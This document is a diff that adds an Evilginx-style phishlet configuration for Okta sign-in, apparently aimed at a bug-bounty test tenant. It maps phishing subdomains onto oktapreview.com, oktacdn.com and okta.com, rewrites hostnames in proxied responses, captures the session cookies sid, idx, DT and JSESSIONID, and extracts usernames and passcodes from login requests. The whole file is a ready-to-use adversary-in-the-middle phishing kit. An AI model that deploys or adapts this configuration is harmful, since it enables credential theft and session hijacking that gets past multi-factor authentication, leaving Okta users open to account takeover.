@@ -1,0 +1,34 @@
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: 'okta', orig_sub: 'bugcrowd-pam-4593', domain: 'oktapreview.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'cdn', orig_sub: 'op3static2', domain: 'oktacdn.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'sso', orig_sub: 'login', domain: 'okta.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'admin', orig_sub: 'bugcrowd-pam-4593-admin', domain: 'oktapreview.com', session: false, is_landing: false, auto_filter: true}
+
+sub_filters:
+  - {triggers_on: 'bugcrowd-pam-4593.oktapreview.com', orig_sub: 'bugcrowd-pam-4593', domain: 'oktapreview.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/javascript', 'application/json', 'text/javascript']}
+  - {triggers_on: 'bugcrowd-pam-4593.oktapreview.com', orig_sub: 'op3static2', domain: 'oktacdn.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/javascript', 'application/json']}
+
+auth_tokens:
+  - domain: '.bugcrowd-pam-4593.oktapreview.com'
+    keys: ['sid', 'idx', 'DT', 'JSESSIONID']
+  - domain: 'bugcrowd-pam-4593.oktapreview.com'
+    keys: ['sid', 'idx', 'DT', 'JSESSIONID']
+
+auth_urls:
+  - '/login/token/redirect.*'
+  - '/app/UserHome.*'
+
+credentials:
+  username:
+    key: 'identifier'
+    search: '(.*)'
+    type: 'json'
+  password:
+    key: 'credentials.passcode'
+    search: '(.*)'
+    type: 'json'
+
+login:
+  domain: 'bugcrowd-pam-4593.oktapreview.com'
+  path: '/login/login.htm'
